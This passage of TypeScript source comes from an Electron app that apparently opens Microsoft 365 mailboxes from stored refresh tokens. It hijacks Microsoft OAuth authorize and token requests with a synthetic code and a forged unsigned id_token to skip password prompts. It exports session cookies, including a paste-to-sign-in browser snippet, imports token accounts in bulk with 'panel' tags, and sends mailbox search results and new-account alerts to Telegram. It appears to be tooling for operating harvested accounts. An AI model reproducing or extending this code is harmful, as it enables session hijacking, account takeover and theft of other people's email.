      // wipe the state of a freshly-opened window for the same account.
      outlookWindow.on('closed', () => {
        clearInterval(owaRefreshTimer);
        // Always safe: per-window resources.
        windowToAccountMap.delete(windowId);
        // Per-(account,mode) shared resources: only purge if we are still
        // the latest open. Otherwise a newer open already replaced them.
        const currentGeneration = outlookWindowGeneration.get(windowKey);
        if (currentGeneration === myGeneration) {
          try {
            outlookSession.protocol.unhandle('https');
            (outlookSession as any).__owaProtocolHandled = false;
          } catch {
            /* ignore */
          }
          msalCacheMap.delete(accountId);
          outlookTokenStore.delete(accountId);
          owaLastSuccessfulRefresh.delete(accountId);
          owaLastAutoHealAt.delete(accountId);
          outlookWindows.delete(windowKey);
          outlookWindowGeneration.delete(windowKey);
        } else {
          appendOutlookDebug(
            `[Outlook] Stale close-handler skipped (gen=${myGeneration}, current=${currentGeneration}) for ${windowKey}`
          );
        }
      });

      dlog('[Outlook] Window created with partition:', (outlookWindow.webContents.session as any).partition);

      // --- OAuth flow interception (protocol-level, below all JavaScript) ---
      // Register a protocol handler on this session that intercepts POST /token
      // requests at the Chromium network layer. When OWA's MSAL tries to exchange
      // an authorization code, we return our real tokens directly.
      // Also intercept GET /authorize and return a fake code response.
      // Token fields must be read from outlookTokenStore so scheduled refresh updates Bearer + MSAL responses.
      const getOwaTok = () => outlookTokenStore.get(accountId);

      function buildTokenResponse(nonce: string): string {
        const t = getOwaTok();
        if (!t) {
          return JSON.stringify({
            error: 'invalid_grant',
            error_description: 'OWA token store empty',
          });
        }
        const oid = t.oid || '';
        const tid = t.tid || '';
        const ci = Buffer.from(JSON.stringify({ uid: oid, utid: tid })).toString('base64');
        const owaClientId = t.clientId || clientIdOverride;
        const idH = Buffer.from(JSON.stringify({ typ: 'JWT', alg: 'RS256', kid: 'dummy' })).toString('base64url');
        const idP = Buffer.from(JSON.stringify({
          aud: owaClientId, iss: `https://login.microsoftonline.com/${tid}/v2.0`,
          iat: Math.floor(Date.now() / 1000) - 60, nbf: Math.floor(Date.now() / 1000) - 60,
          exp: Math.floor(Date.now() / 1000) + 3600, nonce,
          name: t.name || account.email, oid, preferred_username: t.email || account.email,
          rh: '0.AAAA...', sub: oid, tid, ver: '2.0',
        })).toString('base64url');
        return JSON.stringify({
          token_type: 'Bearer',
          scope: t.scope || 'https://outlook.office.com/.default openid profile offline_access',
          expires_in: t.expiresIn || 3600,
          access_token: t.accessToken,
          refresh_token: t.refreshToken,
          id_token: `${idH}.${idP}.`,
          client_info: ci,
        });
      }

      // Persistent partition: only register the protocol handler once per
      // session lifetime. On re-open we keep the existing handler in place,
      // which avoids the unhandle/handle churn that previously cost ~200ms
      // and triggered race conditions with stale close handlers (see
      // commit 1454a04 for the matching close-side fix).
      const sess = outlookSession as any;
      if (sess.__owaProtocolHandled) {
        appendOutlookDebug('[Outlook] Protocol handler reused from previous open');
      } else {
        sess.__owaProtocolHandled = true;

      let tokenInterceptCount = 0;
      outlookSession.protocol.handle('https', async (request) => {
        const u = request.url;

        // 1. Satisfy OWA/MSAL authorize requests with a synthetic auth code.
        // Without this, Outlook can reach Microsoft's login page, pre-fill the
        // mailbox, and then ask for a password even though we already have a
        // valid refresh/access token for the account.
        if (
          request.method === 'GET' &&
          u.includes('login.microsoftonline.com') &&
          u.includes('/oauth2/') &&
          u.includes('/authorize')
        ) {
          try {
            const authUrl = new URL(u);
            const redirectUri = authUrl.searchParams.get('redirect_uri');
            const stateParam = authUrl.searchParams.get('state') || '';
            const nonce = authUrl.searchParams.get('nonce') || crypto.randomUUID();
            const responseMode = (authUrl.searchParams.get('response_mode') || 'fragment').toLowerCase();
            if (redirectUri) {
              const code = `INTERCEPTED:${nonce}`;
              appendOutlookDebug(
                `[ProtocolIntercept] Authorize intercepted mode=${responseMode} client=${authUrl.searchParams.get('client_id') || 'unknown'}`
              );
              if (responseMode === 'form_post') {
                const html = `<!doctype html><html><body><form method="post" action="${redirectUri.replace(/"/g, '&quot;')}"><input type="hidden" name="code" value="${code.replace(/"/g, '&quot;')}"><input type="hidden" name="state" value="${stateParam.replace(/"/g, '&quot;')}"></form><script>document.forms[0].submit();</script></body></html>`;
                return new Response(html, {
                  status: 200,
                  headers: { 'content-type': 'text/html; charset=utf-8' },
                });
              }

              const redirect = new URL(redirectUri);
              const params = new URLSearchParams();
              params.set('code', code);
              if (stateParam) params.set('state', stateParam);
              if (responseMode === 'query') {
                for (const [key, value] of params) redirect.searchParams.set(key, value);
              } else {
                redirect.hash = params.toString();
              }
              return new Response(null, {
                status: 302,
                headers: { location: redirect.toString() },
              });
            }
          } catch (err) {
            appendOutlookDebug(`[ProtocolIntercept] Authorize intercept failed: ${err instanceof Error ? err.message : String(err)}`);
          }
        }

        // 2. Intercept POST /token only for our own synthetic code exchanges.
        // Do NOT hijack normal Microsoft refresh-token flows; let those hit
        // AAD so OWA can establish/renew first-party browser session state.
        if (request.method === 'POST' && u.includes('login.microsoftonline.com') &&
            u.includes('/oauth2/') && u.includes('/token') && tokenInterceptCount < 200) {
          try {
            // IMPORTANT: inspect a clone so the original Request body remains
            // forwardable to AAD for real auth/refresh flows.
            const body = await request.clone().text();
            const isAuthCodeGrant = body.includes('grant_type=authorization_code');
            const isSyntheticCode = body.includes('code=INTERCEPTED') || body.includes('code=INTERCEPTED%3A');
            if (isAuthCodeGrant && isSyntheticCode) {
              tokenInterceptCount++;
              const nonceMatch = isAuthCodeGrant ? body.match(/INTERCEPTED(?:%3A|:)([^&:%]+)/) : null;
              const nonce = nonceMatch ? decodeURIComponent(nonceMatch[1]) : '';
              const grantType = 'authorization_code';
              dlog('[ProtocolIntercept] Returning tokens for grant:', grantType, 'nonce:', nonce ? 'yes' : 'none');
              appendOutlookDebug(`[ProtocolIntercept] Token exchange intercepted grant=${grantType} (#${tokenInterceptCount})`);
              return new Response(buildTokenResponse(nonce), {
                status: 200,
                headers: { 'content-type': 'application/json' },
              });
            }
          } catch (err) {
            console.warn('[ProtocolIntercept] Body read error:', err);
          }
        }

        // 3. For OWA API calls - inject Bearer + anchor headers before forwarding.
        //    protocol.handle bypasses webRequest hooks, so we must add auth here.
        //    request.body is a ReadableStream; we must drain it to a Buffer before re-sending.
        const isOwaApi =
          /outlook\.office\.com|outlook\.office365\.com|outlook\.cloud\.microsoft|substrate\.office\.com|m365\.cloud\.microsoft|admin\.exchange\.microsoft\.com|admin\.microsoft\.com/i.test(
            u
          );
        if (isOwaApi) {
          const headers = new Headers(request.headers);
          const t = getOwaTok();
          if (t && !headers.has('Authorization')) {
            headers.set('Authorization', `Bearer ${t.accessToken}`);
          }
          headers.set('X-AnchorMailbox', account.email);
          headers.set('AnchorMailbox', account.email);
          let body: Buffer | undefined;
          if (request.body) {
            try { body = Buffer.from(await request.arrayBuffer()); } catch { /* no body */ }
          }
          return net.fetch(u, {
            method: request.method,
            headers,
            body: body && body.length > 0 ? body : undefined,
            bypassCustomProtocolHandlers: true,
            duplex: 'half',
          } as any);
        }

        // Forward everything else normally
        return net.fetch(request, { bypassCustomProtocolHandlers: true });
      });
      dlog('[Outlook] Protocol-level OAuth interceptor registered');
      appendOutlookDebug('[Outlook] Protocol-level OAuth interceptor active');
      } // end if (!sess.__owaProtocolHandled)

      outlookWindow.webContents.on('dom-ready', () => {
        void reinjectMsalCacheIntoOwaPage(outlookWindow.webContents, accountId);
      });

      // Track popup BrowserWindows opened via setWindowOpenHandler so they
      // pick up the same accountId mapping (needed for MSAL cache lookups
      // from the preload) and get cleaned out of windowToAccountMap when
      // they close. Without this mapping the popup's MSAL cache request
      // returns {} and the popup looks signed-out.
      outlookWindow.webContents.on('did-create-window', (childWindow) => {
        const childId = childWindow.webContents.id;
        windowToAccountMap.set(childId, accountId);
        appendOutlookDebug(`[Outlook] Popup window opened (id=${childId}), mapped to ${accountId}`);
        childWindow.webContents.on('dom-ready', () => {
          void reinjectMsalCacheIntoOwaPage(childWindow.webContents, accountId);
        });
        childWindow.on('closed', () => {
          windowToAccountMap.delete(childId);
        });
      });

      // Attach Bearer + anchor headers for all modern OWA / substrate hosts (session auth updated by applyOwaTokenBundle + refresh)
      installOutlookPartitionRequestHooks(outlookSession);

      outlookWindow.on('focus', () => {
        void tryRefreshOwaWindowSession(accountId, outlookSession, outlookWindow.webContents, 8 * 60 * 1000, 'focus');
      });

      outlookWindow.webContents.on('did-redirect-navigation', (_event, url) => {
        appendOutlookDebug(`[Outlook] Redirect: ${url}`);
        const cid = extractClientIdFromUrl(url);
        if (cid) {
          void regenerateMsalCacheForClientId(accountId, cid).then((ok) => {
            if (ok) void reinjectMsalCacheIntoOwaPage(outlookWindow.webContents, accountId);
          });
        }
      });
      outlookWindow.webContents.on('did-navigate', (_event, url) => {
        appendOutlookDebug(`[Outlook] Navigate: ${url}`);
      });
      let autoHealInFlight = false;
      const AUTO_HEAL_COOLDOWN_MS = 30000;
      outlookWindow.webContents.on('did-frame-finish-load', async () => {
        try {
          const txt = await outlookWindow.webContents.executeJavaScript(`
            (() => {
              try { return (document.body && document.body.innerText) ? document.body.innerText.slice(0, 5000) : ""; }
              catch (_) { return ""; }
            })()
          `);
          if (typeof txt === 'string' && SIGNED_OUT_TEXT_RE.test(txt)) {
            const now = Date.now();
            const lastHeal = owaLastAutoHealAt.get(accountId) || 0;
            if (autoHealInFlight || now - lastHeal < AUTO_HEAL_COOLDOWN_MS) {
              return;
            }
            autoHealInFlight = true;
            owaLastAutoHealAt.set(accountId, now);
            appendOutlookDebug('[Outlook] Session-expired banner detected in token mode; forcing token refresh + reload');
            void forceRefreshAndReloadOutlookWindow(
              accountId,
              outlookSession,
              outlookWindow.webContents,
              'session-expired-banner'
            ).finally(() => {
              autoHealInFlight = false;
            });
          }
        } catch {
          // ignore read failures
        }
      });
      outlookWindow.webContents.on('console-message', (_event, level, message, line, sourceId) => {
        appendOutlookDebug(`[OWA console:${level}] ${message} (${sourceId}:${line})`);
      });

      outlookWindow.webContents.setUserAgent(
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
      );

      outlookWindow.webContents.on('did-finish-load', () => {
        dlog('[Outlook] Page finished loading:', outlookWindow.webContents.getURL());
        void reinjectMsalCacheIntoOwaPage(outlookWindow.webContents, accountId);
      });
      outlookWindow.webContents.on('did-navigate-in-page', () => {
        void reinjectMsalCacheIntoOwaPage(outlookWindow.webContents, accountId);
      });

      if (process.env.OPEN_OWA_DEVTOOLS === '1') {
        outlookWindow.webContents.openDevTools({ mode: 'detach' });
      }
      outlookWindow.webContents.on('did-fail-load', (_event, errorCode, errorDescription, validatedURL) => {
        // Electron emits ERR_ABORTED (-3) during intentional in-flight navigation
        // replacement; treat that as noise so we only log real load failures.
        if (errorCode === -3) return;
        console.error('[Outlook] Page failed to load:', errorCode, errorDescription, validatedURL);
        appendOutlookDebug(`[Outlook] did-fail-load code=${errorCode} url=${validatedURL} desc=${errorDescription}`);
      });

      // Navigate directly to the target URL. The prior data: overlay approach
      // could race navigation and surface false load errors that looked like
      // auth/session failures.
      void outlookWindow
        .loadURL(startUrl)
        .then(() => {
          dlog('[Outlook] Start URL loaded:', startUrl);
          appendOutlookDebug(`[Outlook] Initial URL loaded (${mode}): ${startUrl}`);
        })
        .catch((loadErr: unknown) => {
          console.error('[Outlook] loadURL failed:', loadErr);
          appendOutlookDebug(
            `[Outlook] loadURL failed: ${loadErr instanceof Error ? loadErr.message : String(loadErr)}`
          );
        });
      dlog('[Outlook] Window opening (direct navigation)');
      appendOutlookDebug('[Outlook] Direct navigation started');
      return { success: true };
    } catch (error: any) {
      console.error('Failed to open Outlook UI:', error);
      appendOutlookDebug(`[Outlook] Open failed: ${error?.message || String(error)}`);
      const raw =
        error?.code === 'REFRESH_TOKEN_EXPIRED'
          ? 'Token refresh failed (invalid_grant). The token may have expired or have the wrong scope. Re-authenticate with EWS scope (https://outlook.office.com/EWS.AccessAsUser.All).'
          : error?.message || String(error);
      const d = diagnoseMicrosoftAuthError(raw);
      const hint = [d.title, d.aadstsCode ? `(${d.aadstsCode})` : '', ...d.suggestions.slice(0, 3)]
        .filter(Boolean)
        .join(' - ');
      throw new Error(`${raw}\n\n${hint}`);
    }
  });

  /**
   * Capture the current OWA cookies for a token account and return them in
   * every format we know about: Cookie-Editor / EditThisCookie JSON, Netscape
   * file, raw `Cookie:` header, and a self-contained DevTools console
   * snippet that signs the user in on paste + refresh.
   */
  ipcMain.handle('account:exportOwaCookies', async (_, accountId: string) => {
    try {
      const snapshot = await captureTokenBackedOwaCookies(accountId);
      appendOutlookDebug(
        `[ExportCookies] Captured ${snapshot.cookies.length} cookies for ${snapshot.account.email} (strong=${snapshot.strongCount})`
      );
      return {
        success: true as const,
        count: snapshot.cookies.length,
        strongCount: snapshot.strongCount,
        email: snapshot.account.email,
        netscape: snapshot.netscape,
        header: snapshot.header,
        extensionJson: snapshot.extensionJson,
        browserSnippet: snapshot.browserSnippet,
        quality: snapshot.quality,
      };
    } catch (error: any) {
      const msg = error?.message || String(error);
      appendOutlookDebug(`[ExportCookies] Failed: ${msg}`);
      return { success: false as const, error: msg };
    }
  });

  // Legacy/unused: the cookie-only "browser sign-in" path bounces to the MS
  // sign-in page because OWA's session cookies are paired with the Bearer
  // header that the token partition's webRequest hook injects. The renderer
  // now wires the 1-click button to mailbox:openOutlook directly (same
  // engine as Play). This stub is kept so older renderer builds don't blow
  // up, but it is no longer reachable from the current UI.
  ipcMain.handle('account:browserSignInOneClick', async (_, accountId: string) => {
    try {
      const storeData = await readStore();
      const accountsList: any[] = storeData.accounts || [];
      const account = accountsList.find((a: any) => a.id === accountId);
      if (!account?.email) throw new Error('Account not found');
      if (account.auth?.type !== 'token') {
        throw new Error('1-click browser sign-in only applies to Microsoft token accounts.');
      }

      // Step 1: prime the token partition so its cookie jar is fully
      // populated. captureTokenBackedOwaCookies already does the priming
      // dance (loadOwaTokenBundle + hidden BrowserWindow + poll) and rejects
      // weak snapshots, so we reuse it.
      const snapshot = await captureTokenBackedOwaCookies(accountId);
      if (snapshot.quality === 'weak') {
        throw new Error(
          `Only helper cookies were captured for ${snapshot.account.email} (no primary auth markers). ` +
          `Open Outlook (the play button) once first to populate the auth cookies, then retry.`
        );
      }

      // Step 2: open a clean "browser" partition and copy every Electron
      // cookie from the token partition into it, fully preserving metadata.
      // Going through Netscape / our parsed-cookie shape silently drops
      // httpOnly / sameSite / hostOnly which is what was making OWA bounce
      // the user back to the sign-in page.
      const sourceSession = session.fromPartition(`persist:outlook-${accountId}`);
      const targetPartition = `persist:owa-browser-${accountId}`;
      const targetSession = session.fromPartition(targetPartition);
      try {
        await targetSession.clearStorageData({ storages: ['cookies'] });
      } catch (err) {
        appendOutlookDebug(
          `[BrowserSignIn] clearStorageData failed: ${err instanceof Error ? err.message : String(err)}`
        );
      }

      const sourceCookies = await sourceSession.cookies.get({});
      let copied = 0;
      for (const c of sourceCookies) {
        if (!c.name) continue;
        const rawDomain = String(c.domain || '');
        const hostForUrl = rawDomain.replace(/^\./, '');
        if (!hostForUrl) continue;
        const url = `${c.secure === false ? 'http' : 'https'}://${hostForUrl}${c.path || '/'}`;
        try {
          await targetSession.cookies.set({
            url,
            name: c.name,
            value: c.value,
            domain: rawDomain || undefined,
            path: c.path || '/',
            secure: c.secure !== false,
            httpOnly: c.httpOnly === true,
            sameSite:
              c.sameSite === 'lax'
                ? 'lax'
                : c.sameSite === 'strict'
                  ? 'strict'
                  : 'no_restriction',
            expirationDate:
              typeof c.expirationDate === 'number' && c.expirationDate > 0
                ? c.expirationDate
                : undefined,
          });
          copied++;
        } catch (setErr) {
          appendOutlookDebug(
            `[BrowserSignIn] cookies.set failed name=${c.name} domain=${rawDomain}: ${setErr instanceof Error ? setErr.message : String(setErr)}`
          );
        }
      }

      if (copied === 0) {
        throw new Error('No cookies could be copied to the browser partition.');
      }

      // Step 3: open a vanilla Chromium window on the new partition. No
      // Bearer hook, no MSAL preload — just the cookies — so the page
      // behaves exactly like a real browser would after the user pasted
      // the cookies into Cookie-Editor.
      const windowKey = `${accountId}:owa-browser`;
      const existing = outlookWindows.get(windowKey);
      if (existing && !existing.isDestroyed()) {
        existing.focus();
        if (existing.isMinimized()) existing.restore();
      } else {
        const win = new BrowserWindow({
          width: 1400,
          height: 900,
          show: true,
          title: `Outlook (browser) - ${account.email}`,
          webPreferences: {
            partition: targetPartition,
            contextIsolation: true,
            nodeIntegration: false,
            sandbox: true,
          },
        });
        outlookWindows.set(windowKey, win);
        const myGen = (outlookWindowGeneration.get(windowKey) || 0) + 1;
        outlookWindowGeneration.set(windowKey, myGen);

        win.webContents.setWindowOpenHandler(({ url }) => {
          try {
            const u = new URL(url);
            const allowedHosts = [
              'outlook.office.com',
              'outlook.office365.com',
              'outlook.cloud.microsoft',
              'login.microsoftonline.com',
              'login.windows.net',
              'admin.exchange.microsoft.com',
              'admin.microsoft.com',
              'm365.cloud.microsoft',
            ];
            const isInternal =
              allowedHosts.includes(u.hostname) ||
              u.hostname.endsWith('.office.com') ||
              u.hostname.endsWith('.office365.com') ||
              u.hostname.endsWith('.exchange.microsoft.com') ||
              u.hostname.endsWith('.cloud.microsoft');
            if (isInternal) {
              return {
                action: 'allow',
                overrideBrowserWindowOptions: {
                  width: 1024,
                  height: 768,
                  webPreferences: {
                    partition: targetPartition,
                    contextIsolation: true,
                    nodeIntegration: false,
                    sandbox: true,
                  },
                },
              };
            }
            shell.openExternal(url).catch(() => {});
          } catch {
            /* ignore */
          }
          return { action: 'deny' };
        });

        win.on('closed', () => {
          if (outlookWindowGeneration.get(windowKey) === myGen) {
            outlookWindows.delete(windowKey);
            outlookWindowGeneration.delete(windowKey);
          }
        });

        win.webContents.setUserAgent(
          'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        );
        await win.loadURL(await applyOwaDisplayLanguage('https://outlook.office.com/mail/inbox'));
      }

      appendOutlookDebug(
        `[BrowserSignIn] One-click for ${account.email}: copied ${copied}/${sourceCookies.length} cookies into ${targetPartition} (snapshot.strong=${snapshot.strongCount})`
      );
      return {
        success: true as const,
        email: account.email,
        count: copied,
        strongCount: snapshot.strongCount,
        quality: snapshot.quality,
      };
    } catch (error: any) {
      const msg = error?.message || String(error);
      appendOutlookDebug(`[BrowserSignIn] One-click failed: ${msg}`);
      return { success: false as const, error: msg };
    }
  });

  /**
   * Copy text directly to the clipboard from the renderer. Used by the
   * "Copy JSON" button in the Export cookies modal.
   */
  ipcMain.handle('clipboard:writeText', async (_, text: string) => {
    try {
      clipboard.writeText(typeof text === 'string' ? text : '');
      return { success: true as const };
    } catch (error: any) {
      return { success: false as const, error: error?.message || String(error) };
    }
  });

  /**
   * Re-apply the stored cookie paste for a cookie-typed account to its OWA
   * partition. Useful as a manual "did the cookies actually take?" check.
   *
   * Returns how many cookies parsed, were Microsoft-related, and were
   * successfully written.
   */
  ipcMain.handle('account:reapplyCookies', async (_, accountId: string) => {
    try {
      const storeData = await readStore();
      const accounts: any[] = storeData.accounts || [];
      const account = accounts.find((a: any) => a.id === accountId);
      if (!account) throw new Error('Account not found');

      const paste = getMicrosoftCookiePasteFromAccount(account);
      if (!paste) {
        throw new Error(
          'No stored cookies for this account. Add cookies in Add Account -> Cookie first.'
        );
      }

      const parsedAll = parseCookiePaste(paste);
      const msCookies = filterMicrosoftRelatedCookies(parsedAll);
      const toApply = msCookies.length ? msCookies : parsedAll;
      if (!toApply.length) {
        throw new Error('Stored cookie payload could not be parsed.');
      }

      const partitionName = `persist:outlook-cookie-${accountId}`;
      const owaSession = session.fromPartition(partitionName);

      const applied = await applyParsedCookiesToSession(owaSession, toApply);
      appendOutlookDebug(
        `[ReapplyCookies] account=${accountId} parsed=${parsedAll.length} ms=${msCookies.length} applied=${applied}`
      );
      return {
        success: applied > 0,
        parsed: parsedAll.length,
        microsoft: msCookies.length,
        applied,
        partition: partitionName,
      };
    } catch (error: any) {
      const msg = error?.message || String(error);
      appendOutlookDebug(`[ReapplyCookies] failed: ${msg}`);
      return { success: false, error: msg };
    }
  });

  // Get list of account IDs that currently have an open Outlook window
  ipcMain.handle('mailbox:getOpenOutlookWindows', () => {
    const openAccounts: string[] = [];
    for (const [windowKey, win] of outlookWindows.entries()) {
      if (!win.isDestroyed()) {
        // Extract accountId from windowKey (format "accountId:mode" or "accountId:mode:cookie")
        const accountId = windowKey.split(':')[0];
        if (accountId && !openAccounts.includes(accountId)) {
          openAccounts.push(accountId);
        }
      }
    }
    return openAccounts;
  });



  // Telegram send alert
  ipcMain.handle('telegram:sendAlert', async (_, bot: string, message: string) => {
    try {
      const store = await readStore();
      const settings = store.settings?.telegram?.[bot];
      if (!settings?.enabled || !settings.token || !settings.chatId) {
        console.warn(`Telegram bot ${bot} not configured or disabled`);
        return { success: false, error: 'Bot not configured' };
      }
      const result = await telegramSendWithRetry(settings.token, settings.chatId, message, 'HTML');
      if (!result.success) logTelegramFailure(`alert:${bot}`, result.error || 'failed');
      return result;
    } catch (error) {
      logTelegramFailure(`alert:${bot}`, String(error));
      return { success: false, error: String(error) };
    }
  });

  // Telegram send search results
  ipcMain.handle('telegram:sendSearchResults', async (_, bot: string, results: any[]) => {
    try {
      const store = await readStore();
      const settings = store.settings?.telegram?.[bot];
      if (!settings?.enabled || !settings.token || !settings.chatId) {
        console.warn(`Telegram bot ${bot} not configured or disabled`);
        return { success: false, error: 'Bot not configured' };
      }
      const includeSnippets = Boolean(settings?.includeSnippets);
      const token = settings.token;
      const chatId = settings.chatId;

      const buildLines = (slice: any[], startIndex: number): string => {
        return slice
          .map((r: any, i: number) => {
            const subj = escapeTelegramHtmlPlain((r.subject || 'No subject').substring(0, 52));
            const folder = escapeTelegramHtmlPlain(String(r.folder || ''));
            let line = `${startIndex + i + 1}. ${subj} (${folder})`;
            if (includeSnippets && r.snippet) {
              const sn = escapeTelegramHtmlPlain(
                String(r.snippet).replace(/\s+/g, ' ').trim().substring(0, 100)
              );
              line += `\n   <i>${sn}</i>`;
            }
            return line;
          })
          .join('\n');
      };

      const first = results.slice(0, 10);
      let text = `<b>Search results (${results.length})</b>\n${buildLines(first, 0)}`;
      if (results.length > 10) {
        text += `\n<i>+ ${results.length - 10} more - continued below</i>`;
      }
      let send = await telegramSendWithRetry(token, chatId, text, 'HTML');
      if (!send.success) {
        logTelegramFailure(`search:${bot}`, send.error || 'failed');
        return send;
      }

      if (results.length > 10) {
        const second = results.slice(10, 25);
        const text2 =
          `<b>Search results (continued)</b>\n${buildLines(second, 10)}` +
          (results.length > 25 ? `\n<i>+ ${results.length - 25} more in app</i>` : '');
        send = await telegramSendWithRetry(token, chatId, text2, 'HTML');
        if (!send.success) {
          logTelegramFailure(`search:${bot}:part2`, send.error || 'failed');
          return { success: false, error: send.error || 'Second message failed' };
        }
      }

      return { success: true };
    } catch (error) {
      logTelegramFailure(`search:${bot}`, String(error));
      return { success: false, error: String(error) };
    }
  });

  // Telegram test
  // Optional: renderer-side account create (e.g. panel sync) - same Telegram as IPC adds
  ipcMain.handle('telegram:accountsNotify', async (_, email: string, via: string) => {
    try {
      const store = await readStore();
      await sendAccountsTelegramNotification(
        store,
        `<b>New account</b>\n${escapeTelegramHtmlPlain(email)}\n<i>Via</i> ${escapeTelegramHtmlPlain(via)}`
      );
      return { success: true };
    } catch (error) {
      logTelegramFailure('accounts:renderer-path', String(error));
      return { success: false, error: String(error) };
    }
  });

  ipcMain.handle('telegram:test', async (_, bot: string) => {
    try {
      const store = await readStore();
      const settings = store.settings?.telegram?.[bot];
      if (!settings?.enabled || !settings.token || !settings.chatId) {
        console.warn(`Telegram bot ${bot} not configured or disabled`);
        return { success: false, error: 'Bot not configured' };
      }
      const label = escapeTelegramHtmlPlain(bot);
      const testText = `\u2705 <b>Watcher Telegram</b> bot <code>${label}</code> is working.`;
      const result = await telegramSendWithRetry(settings.token, settings.chatId, testText, 'HTML');
      if (!result.success) logTelegramFailure(`test:${bot}`, result.error || 'failed');
      return result;
    } catch (error) {
      logTelegramFailure(`test:${bot}`, String(error));
      return { success: false, error: String(error) };
    }
  });

  // Helper to add or update a token account in store
  const addOrUpdateTokenAccount = (store: any, tokenAccount: any): void => {
    const accounts: any[] = store.accounts || [];
    const normalizedEmail = tokenAccount.email.trim().toLowerCase();
    const existingIndex = accounts.findIndex((a: any) => a.email.trim().toLowerCase() === normalizedEmail);
    if (existingIndex >= 0) {
      // Merge existing account
      const existing = accounts[existingIndex];
      // Update auth token (prefer incoming token)
      if (tokenAccount.auth?.type === 'token' && existing.auth?.type !== 'token') {
        existing.auth = tokenAccount.auth;
      } else if (tokenAccount.auth?.type === 'token' && existing.auth?.type === 'token') {
        // Replace refresh token and other fields
        existing.auth = { ...existing.auth, ...tokenAccount.auth };
      }
      // Merge tags (union)
      const existingTags = Array.isArray(existing.tags) ? existing.tags : [];
      const incomingTags = Array.isArray(tokenAccount.tags) ? tokenAccount.tags : [];
      const mergedTags = [...new Set([...existingTags, ...incomingTags])];
      // Remove detached tag if panelId present
      if (tokenAccount.panelId) {
        const detachedIndex = mergedTags.indexOf('detached');
        if (detachedIndex >= 0) mergedTags.splice(detachedIndex, 1);
        // Ensure panel tag exists
        const panelTag = `panel-${tokenAccount.panelId}`;
        if (!mergedTags.includes(panelTag)) mergedTags.push(panelTag);
      }
      existing.tags = mergedTags;
      // Update panelId if incoming has one
      if (tokenAccount.panelId) {
        existing.panelId = tokenAccount.panelId;
      }
      // Update other fields if missing
      if (!existing.name && tokenAccount.name) existing.name = tokenAccount.name;
      if (!existing.status && tokenAccount.status) existing.status = tokenAccount.status;
      if (!existing.added && tokenAccount.added) existing.added = tokenAccount.added;
      if (!existing.lastRefresh && tokenAccount.lastRefresh) existing.lastRefresh = tokenAccount.lastRefresh;
      accounts[existingIndex] = existing;
    } else {
      // Add new account
      const newAccount = {
        id: crypto.randomUUID(),
        email: tokenAccount.email,
        name: tokenAccount.name || tokenAccount.email.split('@')[0],
        panelId: tokenAccount.panelId || null,
        tags: Array.isArray(tokenAccount.tags) ? tokenAccount.tags : [],
        auth: tokenAccount.auth,
        added: tokenAccount.added || new Date().toISOString(),
        lastRefresh: tokenAccount.lastRefresh || null,
        status: tokenAccount.status || 'active',
      };
      accounts.push(newAccount);
    }
    store.accounts = accounts;
  };

  // Import tokens from JSON file
  ipcMain.handle('tokens:importJSON', async (_, filePath: string) => {
    dlog('Import tokens from', filePath);
    try {
      const content = await fs.readFile(filePath, 'utf-8');
      const parsed = JSON.parse(content);
      // Support both the exported payload format and plain array
      const tokens = parsed.tokens || (Array.isArray(parsed) ? parsed : []);
      if (!Array.isArray(tokens)) {
        return { success: false, error: 'Invalid JSON format: expected "tokens" array or root array' };
      }
      const store = await readStore();
      let imported = 0;
      for (const tokenAccount of tokens) {
        if (!tokenAccount.email || !tokenAccount.auth || tokenAccount.auth.type !== 'token') {
          console.warn('Skipping invalid token account:', tokenAccount);
          continue;
        }
        addOrUpdateTokenAccount(store, tokenAccount);
        imported++;
      }
      if (imported > 0) {
        await writeStore(store);
        // Notify renderer? Not needed.
      }
      return { success: true, count: imported };
    } catch (error: any) {
      console.error('Import failed:', error);
      return { success: false, error: error?.message || String(error) };
    }
  });

  // Import tokens with native open dialog
  ipcMain.handle('tokens:importJSONDialog', async () => {
    const win = BrowserWindow.getFocusedWindow() ?? mainWindow;
    const result = win
      ? await dialog.showOpenDialog(win, {
          title: 'Import token accounts',
          filters: [{ name: 'JSON', extensions: ['json'] }],
          properties: ['openFile'],
        })
      : await dialog.showOpenDialog({
          title: 'Import token accounts',
          filters: [{ name: 'JSON', extensions: ['json'] }],
          properties: ['openFile'],
        });
    if (result.canceled || result.filePaths.length === 0) {
      return { success: false, canceled: true };
    }
    const filePath = result.filePaths[0];
    try {
      const content = await fs.readFile(filePath, 'utf-8');
      const parsed = JSON.parse(content);
      const tokens = parsed.tokens || (Array.isArray(parsed) ? parsed : []);
      if (!Array.isArray(tokens)) {
        return { success: false, error: 'Invalid JSON format: expected "tokens" array or root array' };
      }
      const store = await readStore();
      let imported = 0;
      for (const tokenAccount of tokens) {
        if (!tokenAccount.email || !tokenAccount.auth || tokenAccount.auth.type !== 'token') {
          console.warn('Skipping invalid token account:', tokenAccount);
          continue;
        }
        addOrUpdateTokenAccount(store, tokenAccount);
        imported++;
      }
      if (imported > 0) {
        await writeStore(store);
      }
      return { success: true, count: imported };
    } catch (error: any) {
      console.error('Import failed:', error);
      return { success: false, error: error?.message || String(error) };
    }
  });

  const exportTokenAccountsData = async (accountIds?: string[]): Promise<{ success: boolean; data?: any; count?: number; error?: string }> => {
    try {
      const store = await readStore();
      const accounts: any[] = store.accounts || [];
      dlog('[Export] Total accounts in store:', accounts.length);
      let tokenAccounts = accounts.filter((a: any) => a?.auth?.type === 'token');
      dlog('[Export] Token accounts before filtering:', tokenAccounts.length);
      if (accountIds && accountIds.length > 0) {
        dlog('[Export] Filtering by account IDs:', accountIds);
        const idSet = new Set(accountIds);
        tokenAccounts = tokenAccounts.filter((a: any) => idSet.has(a.id));
        dlog('[Export] Token accounts after filtering:', tokenAccounts.length);
      }
      const payload = {
        exportedAt: new Date().toISOString(),
        count: tokenAccounts.length,
        tokens: tokenAccounts.map((a: any) => ({
          id: a.id,
          email: a.email,
          name: a.name,
          status: a.status,
          panelId: a.panelId || null,
          tags: Array.isArray(a.tags) ? a.tags : [],
          auth: {
            type: 'token',
            clientId: a.auth?.clientId,
            authorityEndpoint: a.auth?.authorityEndpoint,
            refreshToken: a.auth?.refreshToken,
            scopeType: a.auth?.scopeType,
            resource: a.auth?.resource,
            v2Token: a.auth?.v2Token || undefined,
          },
          added: a.added,
          lastRefresh: a.lastRefresh,
